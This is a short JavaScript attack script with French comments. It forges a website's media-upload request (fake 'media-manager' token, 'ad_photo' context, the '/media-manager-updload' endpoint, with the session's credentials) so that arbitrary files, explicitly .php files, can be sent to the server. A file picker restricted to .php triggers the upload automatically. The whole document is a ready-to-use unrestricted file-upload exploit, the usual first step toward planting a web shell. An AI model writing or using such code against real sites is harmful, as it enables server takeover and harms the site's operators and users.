// === Nouveau fichier JS pour uploader un fichier PHP directement ===
// Ce script JS crée et envoie une requête POST mimant l'upload classique du site,
// mais compatible avec n'importe quel fichier, notamment les .php

function uploadPhpFile(file) {
  const context = 'ad_photo'; // ou 'ad_file' selon ton champ
  const token = `media-manager-${generateToken()}.${generateToken()}.${generateToken()}`;

  const formData = new FormData();
  formData.append('context', context);
  formData.append('target', token);
  formData.append('name', file.name);
  formData.append('nbslices', '1');
  formData.append('version', 'main');
  formData.append('part', '1');
  formData.append('jMediaUploader', file, file.name);
  formData.append('is_ajax', 'true');

  fetch('/media-manager-updload', {
    method: 'POST',
    credentials: 'include',
    body: formData
  })
  .then(r => r.json())
  .then(console.log)
  .catch(console.error);
}

// Exemple d'utilisation : sélectionner un fichier .php manuellement
const input = document.createElement('input');
input.type = 'file';
input.accept = '.php';
input.onchange = () => {
  const file = input.files[0];
  if (file) uploadPhpFile(file);
};
document.body.appendChild(input);
input.click();

// Fonction de génération de token aléatoire (16 caractères hex)
function generateToken() {
  return Array.from(crypto.getRandomValues(new Uint8Array(8)))
    .map(b => b.toString(16).padStart(2, '0')).join('');
}
